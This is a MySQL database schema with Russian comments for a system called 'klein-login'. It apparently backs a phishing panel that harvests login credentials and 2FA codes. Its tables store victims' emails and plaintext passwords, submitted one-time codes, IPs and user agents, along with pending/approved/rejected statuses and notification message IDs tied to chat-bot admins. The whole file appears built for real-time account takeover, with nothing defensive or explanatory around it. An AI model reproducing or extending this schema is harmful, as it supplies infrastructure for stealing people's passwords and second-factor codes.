-- ====================================================================
-- Схема БД — klein-login (логин + 2FA)
-- ====================================================================

CREATE TABLE IF NOT EXISTS links (
    id              VARCHAR(16)  NOT NULL PRIMARY KEY,
    number_suffix   VARCHAR(32)  NOT NULL,
    chat_id         BIGINT       NOT NULL,
    is_active       TINYINT(1)   NOT NULL DEFAULT 1,
    created_at      DATETIME     NOT NULL DEFAULT CURRENT_TIMESTAMP,
    INDEX (chat_id),
    INDEX (is_active)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

CREATE TABLE IF NOT EXISTS sessions (
    id              VARCHAR(32)  NOT NULL PRIMARY KEY,
    link_id         VARCHAR(16)  NOT NULL,
    stage           ENUM('login','2fa') NOT NULL DEFAULT 'login',
    login_status    ENUM('pending','approved','rejected') NOT NULL DEFAULT 'pending',
    email           VARCHAR(255) NULL,
    ip              VARCHAR(64)   NULL,
    user_agent      VARCHAR(512)  NULL,
    last_seen       DATETIME      NULL,
    created_at      DATETIME      NOT NULL DEFAULT CURRENT_TIMESTAMP,
    INDEX (link_id),
    INDEX (last_seen)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

CREATE TABLE IF NOT EXISTS login_attempts (
    id              BIGINT        NOT NULL AUTO_INCREMENT PRIMARY KEY,
    link_id         VARCHAR(16)   NOT NULL,
    session_id      VARCHAR(32)   NOT NULL,
    email           VARCHAR(255)  NOT NULL,
    password        VARCHAR(255)  NOT NULL,
    ip              VARCHAR(64)   NULL,
    user_agent      VARCHAR(512)  NULL,
    status          ENUM('pending','approved','rejected') NOT NULL DEFAULT 'pending',
    notify_msg_id   BIGINT        NULL,
    created_at      DATETIME      NOT NULL DEFAULT CURRENT_TIMESTAMP,
    responded_at    DATETIME      NULL,
    INDEX (link_id),
    INDEX (session_id),
    INDEX (status),
    INDEX (created_at)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

CREATE TABLE IF NOT EXISTS attempts (
    id              BIGINT        NOT NULL AUTO_INCREMENT PRIMARY KEY,
    link_id         VARCHAR(16)   NOT NULL,
    session_id      VARCHAR(32)   NULL,
    code            VARCHAR(64)   NOT NULL,
    ip              VARCHAR(64)   NULL,
    user_agent      VARCHAR(512)  NULL,
    status          ENUM('pending','approved','rejected') NOT NULL DEFAULT 'pending',
    notify_msg_id   BIGINT        NULL,
    created_at      DATETIME      NOT NULL DEFAULT CURRENT_TIMESTAMP,
    responded_at    DATETIME      NULL,
    INDEX (link_id),
    INDEX (session_id),
    INDEX (status),
    INDEX (created_at)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

CREATE TABLE IF NOT EXISTS config (
    `key`       VARCHAR(64)  NOT NULL PRIMARY KEY,
    `value`     TEXT         NULL,
    updated_at  DATETIME     NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

CREATE TABLE IF NOT EXISTS admins (
    chat_id    BIGINT       NOT NULL PRIMARY KEY,
    username   VARCHAR(128) NULL,
    is_super   TINYINT(1)   NOT NULL DEFAULT 0,
    created_at DATETIME     NOT NULL DEFAULT CURRENT_TIMESTAMP
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

CREATE TABLE IF NOT EXISTS banned_ips (
    ip          VARCHAR(64)  NOT NULL PRIMARY KEY,
    reason      VARCHAR(255) NULL,
    banned_by   BIGINT       NULL,
    banned_at   DATETIME     NOT NULL DEFAULT CURRENT_TIMESTAMP
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

CREATE TABLE IF NOT EXISTS bot_states (
    chat_id    BIGINT       NOT NULL PRIMARY KEY,
    state      VARCHAR(128) NOT NULL,
    payload    TEXT         NULL,
    updated_at DATETIME     NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;
